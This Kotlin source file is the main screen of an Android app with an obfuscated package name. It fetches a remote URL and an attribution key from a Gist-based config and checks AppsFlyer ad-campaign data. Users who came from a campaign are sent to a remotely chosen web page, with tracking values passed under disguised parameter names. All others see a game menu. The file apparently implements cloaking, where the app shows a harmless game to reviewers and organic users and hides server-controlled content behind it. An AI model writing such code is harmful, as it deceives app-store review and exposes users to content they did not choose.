package com.goskapmepdup.dalaylamek

import android.animation.ValueAnimator
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import android.util.Log
import android.widget.ProgressBar
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.goskapmepdup.dalaylamek.util.Vrum
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {
    private var valueAps = 0
    private var api_url: String = ""
    private var api_key_ap: String = ""
    private var api_os_key: String = ""
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val progressBar = findViewById<ProgressBar>(R.id.customProgressBar)
        val animator = ValueAnimator.ofInt(0, 100).apply {
            duration = 3000L
            repeatCount = ValueAnimator.INFINITE
            repeatMode = ValueAnimator.RESTART
            addUpdateListener { animation ->
                val value = animation.animatedValue as Int
                progressBar.progress = value
            }
        }
        animator.start()
        val checkFor = getSharedPreferences("balance", Context.MODE_PRIVATE)
        val getShared = sav(checkFor)
        if (getShared == null || getShared == "empty") {
            getDataAndInitApps(checkFor)
        } else {
            openWend(getShared)
        }
    }
    private fun getDataAndInitApps(sharedPreferences: SharedPreferences) {
        thread {
            try {
                CoroutineScope(Dispatchers.IO).launch {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    withContext(Dispatchers.Main) {
                        if (getJSON != null) {

                            api_key_ap = getJSON.zamaev
                            api_url = getJSON.aram
                            api_os_key = "NEMA"//jsonResponse.getString("osKey")
                            Log.d("MY_TAG", "LAST: devkey: $api_key_ap apiUrl: $api_url oskey: $api_os_key")
                            aps(api_key_ap, sharedPreferences)
                        } else {
                            Log.e("MY_TAG", "Failed to fetch data. Response code: $getJSON")
                            openGen()
                        }
                    }

                }
            } catch (e: Exception) {
                Log.e("MY_TAG", "Error fetching data: ${e.message}")
                openGen()
            }
        }
    }


    private fun sav(checker: SharedPreferences): String? {
        return checker.getString("valueInSharedPreferences", "empty")
    }
    private fun aps(devKey: String, sharedPreferences: SharedPreferences) {
        AppsFlyerLib.getInstance().init(devKey, object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
                Log.d("MY_TAG", "Conversion Data Success")
                if (valueAps == 0) {
                    valueAps = 1
                    if (appfMap != null && appfMap.isNotEmpty()) {
                        val campaign = appfMap["campaign"] as? String
                        val afAd = appfMap["af_ad"] as? String
                        val media    = appfMap["media_source"] as? String
                        Log.d("MY_TAG", "Campaign: $campaign, Ad: $afAd ,  media_source = $media" )

                        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(applicationContext)

                        val link = "$api_url?sttabnrvw=${campaign}&shurznfyz=${afAd}&sxpreff=$media&lsjxwtft=$afId"
                        sharedPreferences.edit().putString("getKey", link).apply()
                        Log.d("MY_TAG", "Generated link: $link")
                        //OneSignal.initWithContext(this@MainActivity, api_os_key)
                        //OneSignal.login(campaign)
                        Log.d("MY_TAG", "OS DONE")
                        runBlocking {
                            Log.d("MY_TAG", "AAAAAA")
                            //OneSignal.Notifications.requestPermission(false)
                            Log.d("MY_TAG", "BBBBBBBBBBBBBBB")
                            openWend(link)
                        }

                    } else {
                        Log.d("MY_TAG", "Attribution data is empty, opening game")
                        openGen()
                    }
                }
            }

            override fun onConversionDataFail(error: String?) {
                Log.e("APPSFLYER", "Conversion Data Fail: $error")
                if (valueAps == 0) {
                    valueAps = 1
                    Log.d("MY_TAG", "Failed to get attribution data, opening game")
                    openGen()
                }
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                Log.d("MY_TAG", "App Open Attribution: $data")
            }

            override fun onAttributionFailure(error: String?) {
                Log.e("MY_TAG", "Attribution Failure: $error")
            }
        }, this)
        AppsFlyerLib.getInstance().start(this)
    }
    private fun openGen() {
        val intent = Intent(this, MenuMainActivity2::class.java)
        startActivity(intent)
        finish()
    }

    private fun openWend(url: String?) {
        val intent = Intent(this, Vrum::class.java)
        if (url != null) {
            intent.putExtra("web_url", url)
        }
        startActivity(intent)
        finish()
    }
}